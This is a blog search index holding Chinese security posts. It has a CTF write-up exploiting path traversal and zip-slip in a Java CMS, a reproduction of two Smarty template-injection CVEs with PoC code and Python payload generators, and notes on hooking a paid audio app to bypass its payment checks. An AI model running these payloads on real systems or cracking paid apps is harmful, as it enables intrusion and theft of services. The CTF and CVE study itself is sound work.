<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红明谷2023 WEB</title>
      <link href="/2023/04/23/%E7%BA%A2%E6%98%8E%E8%B0%B72023%20WEB/"/>
      <url>/2023/04/23/%E7%BA%A2%E6%98%8E%E8%B0%B72023%20WEB/</url>
      
        <content type="html"><![CDATA[<p>开赛时间对社畜来说实在是太不友好了，趁着中午饭空摸鱼做了几道。</p><h1 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h1><p>按照hint “题目内容：每一次点击都是为了让你更接近flag！” 去点击网页按钮，待所有字符输出完毕后得到flag。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x1-Dreamer"><a href="#0x1-Dreamer" class="headerlink" title="0x1 Dreamer"></a>0x1 Dreamer</h2><p>题目是一个CMS框架(v4.0版本)，该版本存在“后台附件管理处存在任意文件下载”漏洞，题目hint给了flag路径，则通过该漏洞可以下载得到flag文件。</p><h3 id="0、漏洞分析"><a href="#0、漏洞分析" class="headerlink" title="0、漏洞分析"></a>0、漏洞分析</h3><p>题目给了源码，后台的附件功能<code>src/main/java/cc/iteachyou/cms/controller/admin/AttachmentController.java</code>74行，上传附件时未对附件做任何处理。</p><img src="image-20230419152819790.png" alt="image-20230419152819790" style="zoom:50%;" /><p>该文件115行，下载时访问文件路径直接进行了路径拼接，因此产生了漏洞。</p><img src="image-20230419152627781.png" alt="image-20230419152627781" style="zoom:50%;" /><h3 id="1、登录后台-附件管理"><a href="#1、登录后台-附件管理" class="headerlink" title="1、登录后台-附件管理"></a>1、登录后台-附件管理</h3><p>根据题目给的源码，README.md给出了后台管理员账号：wangjn:123456。</p><p>找到“附件管理功能”，上传任意附件。</p><img src="image-20230419151628565.png" alt="image-20230419151628565" style="zoom:50%;" /><h3 id="2、修改上传文件路径"><a href="#2、修改上传文件路径" class="headerlink" title="2、修改上传文件路径"></a>2、修改上传文件路径</h3><p>选择附件后，在点击“确认”按钮前进行抓包，修改filePath为flag路径，放包。</p><img src="image-20230419151916555.png" alt="image-20230419151916555" style="zoom:50%;" /><img src="image-20230419152049283.png" alt="image-20230419152049283" style="zoom:50%;" /><h3 id="3、下载文件"><a href="#3、下载文件" class="headerlink" title="3、下载文件"></a>3、下载文件</h3><p>下载新上传的文件，得到flag。</p><img src="image-20230419152156759.png" alt="image-20230419152156759" style="zoom:50%;" /><img src="image-20230419152227500.png" alt="image-20230419152227500" style="zoom:50%;" /><h2 id="0x2-Dreamer-revenge"><a href="#0x2-Dreamer-revenge" class="headerlink" title="0x2 Dreamer_revenge"></a>0x2 Dreamer_revenge</h2><p>因为题目代码同Dreamer，漏洞一样，但是题目没有给flag位置，应该需要getshell找到flag位置。</p><h3 id="1、后台模板管理任意编辑导致路径穿越"><a href="#1、后台模板管理任意编辑导致路径穿越" class="headerlink" title="1、后台模板管理任意编辑导致路径穿越"></a>1、后台模板管理任意编辑导致路径穿越</h3><h4 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1) 漏洞分析"></a>1) 漏洞分析</h4><p><code>src/main/java/cc/iteachyou/cms/controller/admin/TemplateController.java</code>第161行，利用<code>templateFile.getCanonicalPath().startsWith(themeDir.getCanonicalPath())</code>判断文件权限，getCanonicalPath返回的是文件绝对路径，将路径中包含“.”或“..”等当前路径及上层路径表示法，会从路径名中删除“.”和“..”使用真实路径代替，即存在路径穿越问题。</p><img src="image-20230423114014067.png" alt="image-20230423114014067" style="zoom:50%;" /><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2) 漏洞利用"></a>2) 漏洞利用</h4><p><code>src\main\resources\db\dreamer-cms\templates</code>复制<code>default_v2</code>目录修改成<code>default_v3</code>，把v3的<code>theme.json</code>其中的<code>themePath</code>值修改成<code>../../../../../../../../../../../../../../</code>。打包<code>default_v3</code>成<code>default_v3.zip</code>，到后台风格管理处上传zip文件并启用主题，再到模板管理处就可以看到目录下的文件了。</p><h4 id="3-找flag文件"><a href="#3-找flag文件" class="headerlink" title="3) 找flag文件"></a>3) 找flag文件</h4><p>因为没有flag路径，只能一个文件一个文件打开查找flag。</p><p>（由于时间原因，没有找完所有的文件，而且如果flag在隐藏文件中也无法找到，同时这个办法很笨，服务器上文件太多了。</p><p>flag在<code>访问环境变量/proc/1/environ </code>）</p><h3 id="2、后台压缩校验不正确导致Getshell"><a href="#2、后台压缩校验不正确导致Getshell" class="headerlink" title="2、后台压缩校验不正确导致Getshell"></a>2、后台压缩校验不正确导致Getshell</h3><h4 id="1-漏洞分析-1"><a href="#1-漏洞分析-1" class="headerlink" title="1) 漏洞分析"></a>1) 漏洞分析</h4><p><code>src/main/java/cc/iteachyou/cms/utils/ZipUtils.java</code>将*换成&#x2F;，如果文件构造路径<code>..*..*..*..*..*..*..*..*..*etc/passwd</code>经过replace得到<code>../../../../../../../../../etc/passwd</code>，造成路径穿越。</p><img src="image-20230423115304098.png" alt="image-20230423115304098" style="zoom:50%;" /><h4 id="2-漏洞利用-写定时任务"><a href="#2-漏洞利用-写定时任务" class="headerlink" title="2) 漏洞利用-写定时任务"></a>2) 漏洞利用-写定时任务</h4><p>但是服务器没有开定时任务，利用失败。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-smarty模版注入RCE</title>
      <link href="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/"/>
      <url>/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/</url>
      
        <content type="html"><![CDATA[<p>好久没复现漏洞了，最近刷题时遇到了一道smarty模版注入，是cve-2021-xx改编的，便复现几个smarty的模版注入cve，争取逐渐捡起来落下的东西。</p><p>smarty是php模版生成工具，可以将很简单的自定义代码根据它的语法转换成php代码。</p><h2 id="CVE-2017-1000480"><a href="#CVE-2017-1000480" class="headerlink" title="CVE-2017-1000480"></a>CVE-2017-1000480</h2><p>漏洞原理是smarty的display()会展示用户自定义模版，模板文件名可控，结合fetch()可通过get方式获取模板文件名，同时在解析模版（即php代码）时未对文件名进行特殊字符过滤，造成RCE。</p><blockquote><p>这个cve的复现过程，我主要训练的是思路，即如何根据修补情况定位漏洞、漏洞触发原理以及怎么构造漏洞的利用条件，从而启发如何自己通过代码审计发现漏洞。</p></blockquote><h3 id="0x1-漏洞定位"><a href="#0x1-漏洞定位" class="headerlink" title="0x1 漏洞定位"></a>0x1 漏洞定位</h3><h4 id="cve描述-厂商修补位置"><a href="#cve描述-厂商修补位置" class="headerlink" title="cve描述+厂商修补位置"></a>cve描述+厂商修补位置</h4><p>根据cve的漏洞描述和受影响的版本介绍，从smarty修补情况（github）上定位漏洞的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.</span><br></pre></td></tr></table></figure><p>github上对3.1.32版本的change_log.txt找到：<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DFF1F693-E94A-46A6-AE0C-EC0CC07C804A.png" alt="aaa"><br>然后search关键字，找到一个commit 614ad1f8b9b00086efc123e49b7bb8efbfa81b61，对三处代码进行了change<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/C6D1CAFD-077C-451F-823C-35F44556EA2C.png" alt="94e12fd639261795854ba902db1f8275"><br>可以看到主要是template文件名的特殊字符进行了替换，大概猜到漏洞原因是构造了特殊的自定义模板文件名造成的。</p><h3 id="0x2-漏洞触发原理分析"><a href="#0x2-漏洞触发原理分析" class="headerlink" title="0x2 漏洞触发原理分析"></a>0x2 漏洞触发原理分析</h3><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><p>从smarty 3.1.32对三处代码下断点。</p><p>由于不熟悉smarty语法，对这三处进行静态分析时，找不到相关函数的上下文关系，即“Find Usage”失效，search 函数名又有太多处代码会调用create函数。因此转而通过动态调试进行分析。</p><p>第一个想法是直接拿别人构造好的代码来用，但这样不利于漏洞利用链的构造。</p><p>根据cve描述，漏洞通过display和fetch产生，利用smarty官网的display()demo，尝试函数能不能执行到create。很幸运，成功了。<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8B425F92-C089-45E3-AA7A-23D160A04376.png" alt="a2192715ebe79b76bb5d161ceaa0de93"><br>查看寄存器，此时的$output值为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* Smarty version 3.1.31, created on 2022-10-19 23:16:46</span><br><span class="line">  from &quot;[path]/templates/index.tpl&quot; */.........</span><br></pre></td></tr></table></figure><p>即构造模版时会生成一段版权声明，文件名是通过display()传递的参数，而文件名可以构造，那么只要让前后的注释符闭合，中间插入恶意代码即可。</p><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>create的调用栈<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/DB37467D-76B3-4008-842E-CCE725E1554B.png" alt="05fba457e37f95e7d82618b249eca792"><br>核心smarty_template_compiled.php的process()，第100和103行，编译和加载模版过程<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/8671B076-B0FB-4309-9DFF-B3CB506C90DA.png" alt="853e702401f40ca280d022feeb9e9d7e"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/9F355EBA-AE79-494F-ADBF-C0BE40547D9D.png" alt="471dccfcc713362a5af6e8c23849cf26"></p><h3 id="0x3-poc"><a href="#0x3-poc" class="headerlink" title="0x3 poc"></a>0x3 poc</h3><p>经过多次调试和代码追踪，display()都会执行到create()，结合fetch()，构造一个类模板，类名可get获得。直接用了<a href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">chybeta</a>的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">include_once(&#x27;../libs/Smarty.class.php&#x27;);</span><br><span class="line">define(&#x27;SMARTY_COMPILE_DIR&#x27;, &#x27;/tmp/templates_c&#x27;);</span><br><span class="line">define(&#x27;SMARTY_CACHE_DIR&#x27;, &#x27;/tmp/cache&#x27;);</span><br><span class="line"></span><br><span class="line">class test extends Smarty_Resource_Custom</span><br><span class="line">&#123;</span><br><span class="line">  protected function fetch($name, &amp;$source, &amp;$mtime)</span><br><span class="line">  &#123;</span><br><span class="line">    $template = &quot;CVE-2017-1000480 smarty PHP code injection&quot;;</span><br><span class="line">    $source = $template;</span><br><span class="line">    $mtime = time();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$smarty = new Smarty();</span><br><span class="line">$my_security_policy = new Smarty_Security($smarty);</span><br><span class="line">$my_security_policy-&gt;php_functions = null;</span><br><span class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line">$my_security_policy-&gt;modifiers = array();</span><br><span class="line">$smarty-&gt;enableSecurity($my_security_policy);</span><br><span class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</span><br><span class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</span><br><span class="line">$smarty-&gt;registerResource(&#x27;test&#x27;, new test);</span><br><span class="line">$smarty-&gt;display(&#x27;test:&#x27; . $_GET[&#x27;chybeta&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/demo/index.php?chybeta=*/phpinfo();/*</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/CBCB1774-85AA-4E1D-9572-AFFDCCE0A190.png" alt="c5f9510a1b157b5c8cff18a72c1987a4"></p><h2 id="CVE-2021-29454"><a href="#CVE-2021-29454" class="headerlink" title="CVE-2021-29454"></a>CVE-2021-29454</h2><p>还是从<a href="https://github.com/smarty-php/smarty/commit/215d81a9fa3cd63d82fb3ab56ecaf97cf1e7db71">github commit</a>入手<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/D98205D2-0426-4B02-A00C-4C60C7B94B69.png" alt="547399f3be5a1048abaf779af2b5fcfd"><br>增加对php规定字符、变量的匹配，并给出regexp的构造形式</p><p>存在漏洞的版本，仅对传入的数学表达式进行php规定字符变量匹配，符合规定就eval<br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/193A81EB-5208-4014-AFAA-6E1908E16525.png" alt="da076710d91d5bdec32c1fd89dfd3b98"><br><img src="/2022/10/28/php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5RCE/2E8EB5E2-139C-4194-8C00-70D9A8077C9F.png" alt="785447238fb694d00cd627c442d5e3ce"><br>那么关键是如何绕过reg</p><h3 id="0x1-利用"><a href="#0x1-利用" class="headerlink" title="0x1 利用"></a>0x1 利用</h3><h4 id="无字符RCE"><a href="#无字符RCE" class="headerlink" title="无字符RCE"></a>无字符RCE</h4><p>利用reg允许的字符集（0-9、a-zA-Z）、白名单函数拓展额外的字符集</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expand_ascii</span>():<span class="comment">#0-9E.</span></span><br><span class="line">    rec = &#123;&#125;</span><br><span class="line">    var = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(a)^<span class="built_in">ord</span>(b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">s</span>):</span><br><span class="line">        keys = <span class="built_in">list</span>(rec.keys())</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> keys:</span><br><span class="line">            t = xor(s,c)</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> rec.keys():</span><br><span class="line">                rec[t] = rec[s]+rec[c] <span class="comment">#记录新扩展的字符由哪两个元字符构成（list+list=&gt;list）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand_all</span>():</span><br><span class="line">        <span class="comment">#构造0-9E. 字典 rec = &#123;dict&#125;&#123;&#x27;0&#x27;:[&#x27;0&#x27;]&#125;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            rec[<span class="built_in">str</span>(i)] = <span class="built_in">list</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        rec[<span class="string">&quot;E&quot;</span>] = [<span class="string">&quot;E&quot;</span>]</span><br><span class="line">        rec[<span class="string">&quot;.&quot;</span>] = [<span class="string">&quot;...&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):<span class="comment">#</span></span><br><span class="line">            expand(random.choice(<span class="built_in">list</span>(rec.keys())))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> rec.keys():</span><br><span class="line">            c = Counter(rec[k]) <span class="comment">#计算每个value的值的重复个数</span></span><br><span class="line">            rec[k] = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> c.keys() <span class="keyword">if</span> c[_] % <span class="number">2</span>] <span class="comment">#扩展字符集的数据处理，比方说&#x27;k&#x27;=X^Y=&#x27;3&#x27;^&#x27;..,&#x27;^&#x27;3&#x27;^&#x27;E&#x27;=&#x27;...&#x27;^&#x27;E&#x27;，需要剔除重复的，即异或后为0的</span></span><br><span class="line">            <span class="built_in">print</span>(rec)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">        expand_all()</span><br><span class="line">        <span class="comment">#制定模板</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i)</span><br><span class="line">            var[<span class="built_in">str</span>(i)] = <span class="string">f&quot;((<span class="subst">&#123;c&#125;</span>.<span class="subst">&#123;c&#125;</span>)[0])&quot;</span></span><br><span class="line">        var[<span class="string">&quot;E&quot;</span>] = <span class="string">&quot;((exp(100).b)[15])&quot;</span>  <span class="comment"># exp(100)==2.6881171418161E+43</span></span><br><span class="line">        var[<span class="string">&quot;...&quot;</span>] = <span class="string">&quot;((exp(100).b)[1])&quot;</span>  <span class="comment"># point =&gt; .</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">cmd</span>): <span class="comment"># 参数命名时要以其实际含义，而不是参数类型，一开始仅想到str，但是str具体代表什么呢</span></span><br><span class="line">        code = [<span class="string">f&quot;(<span class="subst">&#123;<span class="string">&#x27;^&#x27;</span>.join(rec[c])&#125;</span>)&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> cmd] <span class="comment">#利用字符集构造命令</span></span><br><span class="line">        <span class="comment">#f&quot;(&#123;&#x27;^&#x27;.join(rec[c])&#125;)&quot; 如何得到&#x27;(5^E)&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join(code)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace_var</span>(<span class="params">code</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> var.keys():</span><br><span class="line">            code = code.replace(c,var[c])</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_exp</span>(<span class="params">expr</span>):</span><br><span class="line">        var_expr = [<span class="string">&quot;=&quot;</span>.join((<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i),<span class="built_in">str</span>(i))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;string: &#123;math equation=&quot;%s&quot; %s&#125;&#x27;</span> % (expr, <span class="string">&quot; &quot;</span>.join(var_expr))</span><br><span class="line"></span><br><span class="line">    init()</span><br><span class="line">    func = replace_var(generate_code(<span class="string">&quot;phpinfo&quot;</span>))</span><br><span class="line">    payload = generate_exp(<span class="string">f&quot;(<span class="subst">&#123;func&#125;</span>)()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="根据reg找漏网之鱼"><a href="#根据reg找漏网之鱼" class="headerlink" title="根据reg找漏网之鱼"></a>根据reg找漏网之鱼</h4><p>匹配中仅剔除反引号、美元符（该符号可自定义变量），可以构造八进制字符串实现（八进制特征：反斜杠、数字）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;(&quot;phpinfo&quot;)()&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;\\&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        string += <span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    string += <span class="string">&#x27;\\\\&#x27;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(string)</span><br></pre></td></tr></table></figure><blockquote><p>tips:<br>构造RCE的时候，函数名称要用(“”)包含起来，不然利用不成功，调试过程中没发现smarty的特殊要求</p></blockquote><p>ref：<a href="https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty">https://250.ac.cn/2022/03/22/CVE-2021-29454/#smarty</a></p><h3 id="0x2-例题"><a href="#0x2-例题" class="headerlink" title="0x2 例题"></a>0x2 例题</h3><p>2022红明谷杯 Smarty Caculator</p><p>存在源码泄露（工具跑了一个晚上，才找到……）</p><p>根据版本对比github版本，仅三个文件被修改，然后就盯着被修改的地方死活想不明白跟这个cve有什么关系……</p><blockquote><p>后来才绕出来，例题版本&lt;CVE版本，该CVE可以直接利用……麻了，陷入了思维定式</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missevan 功能逆向分析</title>
      <link href="/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="样本"><a href="#样本" class="headerlink" title="样本"></a>样本</h2><p>包名：cn.missevan<br>版本：5.5.0</p><h2 id="“已购”（失败）"><a href="#“已购”（失败）" class="headerlink" title="“已购”（失败）"></a>“已购”（失败）</h2><p>分析付费广播剧“已购”功能</p><h4 id="反编译APP"><a href="#反编译APP" class="headerlink" title="反编译APP"></a>反编译APP</h4><p>Apktool反编译apk时，遇到“dex部分加密”问题，解决办法：.&#x2F;apktool d xx.apk –only-main-classes。</p><h4 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h4><p>一开始Jeb一个一个dex分析，但是dex之间函数调用、交叉引用非常难找（共6个dex），后面jadx好用了很多。Jeb无法对apk整体分析报错为内存不够，扩大java内存也没有解决，后放弃。</p><h4 id="定位与hook"><a href="#定位与hook" class="headerlink" title="定位与hook"></a>定位与hook</h4><p>付费，与pay有关，搜索关键字，发现有很多getNeedPay、getPayType、needPay、getCurrentNeedPay关键字函数以及字符串，通过objection 逐一hook查看是否真的被调用，全部hook并修改返回值，其中getCurrentNeedPay返回-1，剩余返回2。<br>（linux 在文件夹下所有文件中查找字符串：grep -r “strs”dir；jadx直接搜索关键字，勾选insentive case，忽略大小写）<br> 这里一开始没有对getCurrentNeedPay进行hook，导致进入付费音频播放界面后显示“立即收听”，通过搜索关键字，分析上下文代码才发现对getCurrentNeedPay进行了判断。<br><img src="/2022/08/04/missevan%20%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1ADAF972-E991-4A1B-A278-F1E98AF13EDA.png" alt="674e49409ce418a6526ab17ff26529a2.png"><br>（完整hook脚本见js）</p><h4 id="重点突破，逆向分析、hook"><a href="#重点突破，逆向分析、hook" class="headerlink" title="重点突破，逆向分析、hook"></a>重点突破，逆向分析、hook</h4><p>hook完后页面由“付费”-&gt;“已购”，但是进入付费音频播放界面仍不播放音频。</p><p>在objection中对函数调用栈逐层往上追溯，发现handlemsg（cn.missevan.play.utils.PlayCallbackHandler.handleMessage）中免费和付费的“soundurl”值不同，即付费的值为空。</p><p>(由于较敏感，hook 图片已隐藏)</p><p>分析上下文，因为是回调，通过调用栈就能看出无法追溯发送消息的源头。</p><h5 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h5><p>搜索所有“soundurl”关键字，看是哪个函数处理或者发送url的，但是objection hook所有，实际都没有调用相关函数……是个幌子。</p><h5 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h5><p>通过卡住的界面，寻找可疑函数，这里的寻找方式是通过付费音频播放界面后显示“立即收听”分析上下文，找到付费音频播放界面类是“cn.missevan.view.fragment.PlayFragment”，以及之前卡住的“getCurrentNeedPay”进行静态代码分析，实际上并没有找到播放音频的相关函数。之后全局寻找播放音频的类（mediaplayer之类的，objection一hook app就崩了，有可能是hook的类或者函数不对，导致多进程运行时程序卡住崩溃，因为涉及到音频系统类的源码分析，由于水平不够没再往下分析）……猜测要么是so处理，要么服务器后台做了身份认证等处理，导致服务器就没返回可播放的url，音频类自然无法正常播放。</p><p>(由于较敏感，hook 图片已隐藏)</p><p>这里有个小插曲，“cn.missevan.play.utils.PlayUtils.isPlaying”如果hook返回为true，付费的音频也可以自动加载弹幕，但仍无法播放音频。分析上下文未找到音频相关函数或代码逻辑。</p><h5 id="思路3"><a href="#思路3" class="headerlink" title="思路3:"></a>思路3:</h5><p>尝试抓包，没看出区别。因为都是okhttp3传输，分析了上下文，没找到。</p><h5 id="思路4"><a href="#思路4" class="headerlink" title="思路4:"></a>思路4:</h5><p>So处理的话，全局搜索java jni注册声明（static native xx xx），没有发现与播放相关的类函数使用了jni；身份认证，则需要伪装成已购买用户，猜测服务器对userid的购买记录做了报错，单从客户端无法解决。</p><h5 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h5><p>未成功<br>1） 函数反射、handle、okhttp的跟踪分析：对Android开发、回调机制了解不够<br>2） Interface接口的重写：全局搜索接口类，寻找所有可能重写的类逐一分析&#x2F;hook调用情况。<br>3）换种思路：修改钻石数量，直接买剧，即无限钻石版。（待尝试） 4、 网上的破解版：<br>对比分析，破解版仅修改了getNeedPay的返回值（2），其余没动，但是效果跟我的hook结果一样。<br>同时破解版内嵌了签名修改hook代码：<a href="https://www.52pojie.cn/thread-995777-1-1.html">https://www.52pojie.cn/thread-995777-1-1.html</a></p><h2 id="“无限钻石”（待尝试）"><a href="#“无限钻石”（待尝试）" class="headerlink" title="“无限钻石”（待尝试）"></a>“无限钻石”（待尝试）</h2><p>思路：修改购买成功的回传包（困难）、hook相关钻石数量代码的返回值（容易，但成功率如何？）<br><img src="/7e989e27f9b9dbf906a93f24ab3cc6c6.png" alt="7e989e27f9b9dbf906a93f24ab3cc6c6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidReverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThorVPN破解使用有效期</title>
      <link href="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/"/>
